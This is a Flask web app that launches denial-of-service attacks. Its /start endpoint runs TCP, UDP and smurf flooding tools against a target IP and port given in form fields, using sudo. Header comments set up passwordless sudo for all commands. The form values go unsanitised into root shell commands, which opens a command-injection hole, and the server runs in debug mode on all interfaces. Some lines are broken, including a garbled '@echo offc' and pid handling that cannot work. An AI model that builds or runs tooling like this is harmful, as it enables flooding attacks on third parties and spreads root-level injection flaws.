# use env in ./flask_app 
# flask run
# kill $(pidof a.out)
# use sudo without password -----------------
# sudo visudo
# <USER> <FROM>=<ACTAS> NOPASSWD: <CMDS>
# sikako ALL=(ALL) NOPASSWD: ALL
# -------------------------------------------

from flask import Flask,request
import os
import subprocess

attack = ""

app = Flask(__name__)
@app.route("/start", methods=["POST"])
def start_pid():
    global attack
    attack = request.form["attack"]
    IP = request.form["IP"]
    port = request.form["port"]

    if attack == 'tcp_attack':
        mode = request.form["mode"]
        cmd = f"sudo ../tools/{attack} {IP} {port} {mode}"
    elif attack == 'udp_attack':
        cmd = f"sudo ../tools/{attack} {IP} {port}"
    elif attack == 'smurf.attack':
        BcstIP = request.form["BdstIP"]
        cmd = f"sudo ../tools/{attack} {IP} {BcstIP}"

    os.system("@echo offc")
    r = os.system(cmd)
    return "start attack"

@app.route("/stop")
def close_pid():
    global attack
    pid = os.system(f"pidof {attack}")
    cmd = f"sudo kill -9 {pid}"
    r = os.system(cmd)
    # rebuild = os.system('python3'+str(os.path.basename(__file__)))
    return "stop attack"




if __name__ == '__main__':
    app.run(debug=True,host="0.0.0.0",port="9999")